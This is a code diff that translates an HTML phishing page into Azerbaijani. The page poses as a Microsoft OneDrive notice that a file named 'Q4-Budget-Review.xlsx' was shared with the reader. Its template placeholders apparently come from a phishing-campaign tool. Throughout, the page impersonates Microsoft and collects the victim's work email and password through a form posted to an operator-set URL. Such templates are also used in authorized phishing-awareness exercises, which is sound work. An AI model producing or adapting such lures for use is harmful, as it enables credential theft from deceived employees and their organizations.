@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="en">
+<html lang="az">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Shared document</title>
+<title>Paylaşılan sənəd</title>
 <style>
   *{box-sizing:border-box}
   body{margin:0;font-family:"Segoe UI",-apple-system,Roboto,Helvetica,Arial,sans-serif;color:#1b1b1b;background:#f3f6fb}
@@ -34,21 +34,21 @@
   <div class="wrap">
     <form class="card" method="post" action="{{.SubmitURL}}" autocomplete="off">
       <svg class="doc" viewBox="0 0 48 48"><rect x="9" y="4" width="26" height="40" rx="2" fill="#0364b8"/><rect x="13" y="4" width="26" height="40" rx="2" fill="#2b88d8"/><path d="M19 15h14M19 21h14M19 27h10" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
-      <h1>{{.FirstName}}, a document was shared with you</h1>
-      <p class="meta">Someone in your organization shared a file via OneDrive.</p>
+      <h1>{{.FirstName}}, sizinlə sənəd paylaşıldı</h1>
+      <p class="meta">Təşkilatınızda bir nəfər OneDrive vasitəsilə fayl paylaşıb.</p>
       <div class="file">
         <svg viewBox="0 0 24 24" fill="#0364b8"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/></svg>
         Q4-Budget-Review.xlsx
       </div>
       <hr class="divider">
-      <p class="meta" style="text-align:left">Sign in with your work or school account to view the document.</p>
-      <label for="e">Email</label>
+      <p class="meta" style="text-align:left">Sənədi görmək üçün iş və ya məktəb hesabınızla daxil olun.</p>
+      <label for="e">E-poçt</label>
       <input id="e" name="email" type="email">
-      <label for="p">Password</label>
+      <label for="p">Şifrə</label>
       <input id="p" name="password" type="password">
-      <button type="submit">Open document</button>
+      <button type="submit">Sənədi aç</button>
     </form>
   </div>
-  <div class="foot">Microsoft OneDrive &middot; This email was sent by an automated system.</div>
+  <div class="foot">Microsoft OneDrive &middot; Bu mesaj avtomatik sistem tərəfindən göndərilib.</div>
 </body>
 </html>
